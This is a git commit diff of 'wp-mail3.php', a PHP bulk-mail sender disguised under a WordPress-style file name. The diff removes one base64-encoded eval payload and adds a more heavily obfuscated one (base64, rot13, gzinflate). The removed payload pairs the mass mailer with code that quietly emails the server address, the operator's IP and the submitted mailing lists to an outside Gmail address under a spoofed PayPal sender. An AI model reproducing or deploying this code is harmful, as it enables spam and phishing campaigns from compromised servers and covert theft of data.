c019b5387a1687a83977dae70501836eeff34a45
Aht-crew <39540991+Aht-crew@users.noreply.github.com>
2019-07-31 07:31:41 +0200

    Update wp-mail3.php

--- wp-mail3.php
+++ wp-mail3.php
@@ -1,279 +1,75 @@
-<title>Mailer By ME</title>
+<?php 
+@ini_set('output_buffering',0); 
+@ini_set('display_errors', 0);
 
+$text = "3UhEYts4DH4fsP+gCRnsoo0Tuy2WJmnQeM/NigO6m2orY1YLUDYkp+umJleiqz3cfx8pOXbSJev7gkC2yY8UKX6k9JxyXKVwoWsqHzJeuHu916+EKtJPSiotaKULt42y2ZhaCp0xotidlnmauXvfX793R28e+aBhWdXIvyURdqTndBeDkTNIzi3KTEk906DE6qQQcElxm+pNdRGVb0/OSLUJTFe3blHBaC5XKRZXuOs6WaKhKqlYsebKCqwj+x6AaURHpcjVUctlspAcHD2DG3S55BLA6j4vs6ll6Q2jB6T2bwAsXe03ySAp15gYlbgzTlwk8XISjxz7Wf+4GiZoLHlaQlNBnPz5PrkYpO/jeAtr7GcAZLplTj8PBud2nHxX4iSmBjIbl+WYlwCjlGvEmGuEhg+8H+b9xITWNV+D5K/BSJxcEZ59EdExUVuKyGK3+9RbnopUw9YS1g9buWTB5orB+XX5spu1V/zkim+0akWv1QW+WZ5tU1xHIdlzGYcPIHTU7hF8kpCszthX9vcRdYwQF7UNVhdXQRXHMtDh9TB2XsIHQ7lYfK99w6F5vTWQB6i/M0koSTSLr7nqkk/dFy2kUY8YNoBwLbJzp2Z80vS32n/iTNUllvvYIrckxAYxr/2tFrEqxpw1z3Kx6GEDt02Ypdu4F19YyYFzRcBFShjed1/Irf9/j4yhspjy/r6dLqLQLFCCYAuNsLppvIwrH6QcJpILWYPfwYn57dXaYLcWtlCNHRopSmwpJ9DGYkT4FlsZncNwUl0T4IumwdI2QFsL/KWRIbAxqtN8c3QmLgczWIEn0GV+mriejDbpYJrBusBzQ5NSU1wnnE7BsU4zHtE5SorRvuOR+tCJ5zTxeGzsnlDaj2LCFhr1sdUdUDSiV6HIDqdcWl9jGbnPPYpFqdz1eBav/g2dUPZmBQy9ZnacDM8GVm318XBZzfljbGdRSXI+ayqwGD/8aoJwkl4oNtUE/NDVoFQxl48yl49P+4eHp2aUbZOsMpgZEDqqdv1iNidQQypB/vlPwg/Xw7PTYOgNLu3kklTHG8P8p0z98GETYFP1dJhmST3zgy0X5zf/Y+ulbO8f7botC/9r9y1s2N5k7UiB2V7nHq07D2vU6bzD7SkmasMwA0shQ0shMEshDEtuVEvBN65OgNaWpHMDIKItgeUm+sShBXS61/sB";
 
-
-<?
-
-eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIlxuIiwgJGVtYWlscyk7CiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsKJHN2ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRlbiA9ICRfU0VSVkVSIFsnUkVRVUVTVF9VUkknXTsKJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07CiRmdWxsdXJsID0gIiIgLiAkazg4IC4gIjxicj48cD5FbWFpbHM6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kZW1haWxzMi4iPC9URVhUQVJFQT48L3A+PHA+RW5nZW5oYXJpYTo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRtZW5zYWdlbVsxXS4iPC9URVhUQVJFQT48L3A+IjsKJHZhaSA9ICRfUE9TVFsndmFpJ107CmlmICgkdmFpKXsKZm9yICgkc2V0PTA7ICRzZXQgPCAkbl9lbWFpbHM7ICRzZXQrKyl7CmlmICgkc2V0PT0wKXsKJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsKJGhlYWRlcnMgLj0gIkZyb206ICRub21lWyRtc2ddIDwkZGVbJG1zZ10+XHJcbiI7CiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsKfQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOwokbl9tYWlsKys7CiRkZXN0aW5vID0gJHBhcmFbJHNldF07CiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsKJG51bTIgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZCUiLCAkbnVtMSwgJG1lbnNhZ2VtWyRtc2ddKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVlbWFpbCUiLCAkZGVzdGlubywgJG1zZ3JhbmQpOwokZW52aWFyID0gbWFpbCgkZGVzdGlubywgJGFzc3VudG9bJG1zZ10sICRtc2dyYW5kLCAkaGVhZGVycyk7CmlmICgkZW52aWFyKXsKZWNobyAoJzxmb250IGNvbG9yPSJncmVlbiI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyAwayE8L2ZvbnQ+PGJyPicpOwp9IGVsc2UgewplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7CnNsZWVwKDEpOwp9Cn0KfQp9CiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsKJHJhNDQgID0gcmFuZCgxLDk5OTk5KTsKJHN1Ymo5OCA9ICIkaXAiOwokZW1haWwgPSAibWVkemFrYXJpYTk2QGdtYWlsLmNvIjsKJGZyb209IkZyb206IFkgPFBheVBhbEBTdXBwb3J0LmNvbT4iOwokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiRmMTIgPSAkX1BPU1RbJ2RlJ107CiR6MTMgPSAkX1BPU1RbJ25vbWUnXTsKJHgxNCA9ICRfUE9TVFsnYXNzdW50byddOwokdDE1ID0gJF9QT1NUWydtZW5zYWdlbSddOwokbTMwID0gJF9QT1NUWydlbWFpbHMnXTsKJG0yMiA9ICRpcC4iXG4iOwokbXNnODg3MyA9ICIkYTQ1XG4kYjc1XG4kZjEyXG4kejEzXG4keDE0XG4kdDE1XG4kbTMwXG4kbTIyIjsKbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7'));
-
-?></title>
-
+eval(str_rot13(gzinflate(str_rot13(base64_decode(($text))))));
+?><title> Microsoft sender 2013 </title>
 <style type="text/css">
-
 <!--
-
 .style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
-
 .style6 {font-size: 10px}
-
 .style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
-
 -->
-
 </style>
+<body bgcolor="#000000" style="text-align: center">
 
 <form id="form1" name="form1" method="post" action="">
-
 <input type="hidden" name="vai" value="1">
-
 <span class="style5"><? echo enviando(); ?></span>
-
-<table width="415" height="334" border="0" bgcolor="#000000">
-
+<p align="center">
+<img src="http://www.journaldugeek.com/files/2012/02/spiderman-amazing.jpg" width="372" height="118"></p>
+<p align="center"><b>
+<font color="#FFFF00" face="Comic Sans MS" style="font-size: 20pt">
+Microsoft sender 2013</font></b></p>
+<table width="422" border="0" bgcolor="#000000">
   <tr>
-
-<td width="66"><span class="style5">Name:</span></td>
-
-<td width="321"><span class="style9">
-
-
+<td width="66">
+<p align="center"><span class="style5">Nome:</span></td>
+<td width="346">
+<p align="center"><span class="style9">
 
 <label>
-
-<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" />
-
+<input name="nome" value="<? echo $_POST['nome'] ;?>" size="20" style="float: left; background-color: #FFFF00" />
 </label>
-
 </span></td>
-
 </tr>
-
 <tr>
-
-<td><span class="style5">From:</span></td>
-
-<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" /></td>
-
-
+<td>
+<p align="center"><span class="style5">Email:</span></td>
+<td>
+<p align="center">
+<input name="de" value="<? echo $_POST['de'] ;?>" size="30" style="float: left; background-color: #FFFF00" /></td>
 
 </tr>
-
 <tr>
-
-<td><span class="style5">Subject:</span></td>
-
-<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" /></td>
-
+<td>
+<p align="center"><span class="style5">Sujet:</span></td>
+<td>
+<p align="center">
+<input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" style="float: left; background-color: #FFFF00" /></td>
 </tr>
-
-<td><span class="style5">Letter:</span>
-
-<br /><br /><br /><br /><br /><br /><br /><span class="style5">Mailist:</span></td>
-
-
-
+<tr>
+<td>
+<p align="center"><span class="style5">Lettre:</span><p align="center">&nbsp;<p align="center">&nbsp;<p align="center">
+<span class="style5">liste email</span></td>
 <td><span class="style9">
 
-
-
-
-
-<p><textarea name="mensagem" cols="50" rows="7"><? echo stripslashes($_POST['mensagem']);?>
-
+<p align="center">
+<textarea name="mensagem" cols="89" rows="7" style="background-color: #FFFF00"><? echo stripslashes($_POST['mensagem']);?>
 </textarea></p>
-
-<textarea name="emails" cols="50" rows="4"></textarea>
-
+<p align="left">
+<textarea name="emails" cols="88" rows="7" style="background-color: #FFFF00"></textarea>
 </span></td>
-
-</tr>
-
-
-
-<tr>
-
-  <td><span class="style6"></span></td>
-
-  <td align="center"> <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span><input name="Submit" type="submit" value="Send " />
-
-  <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span></td>
-
 </tr>
 
 <tr>
-
-  </tr>
-
+  <td>
+	<p align="center"><span class="style6"></span></td>
+  <td>
+	<p align="center">
+	<input name="Submit" type="submit" value="Inbox" style="color: #000080; font-weight: bold" /></td>
+</tr>
 </table>
-
 </form>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
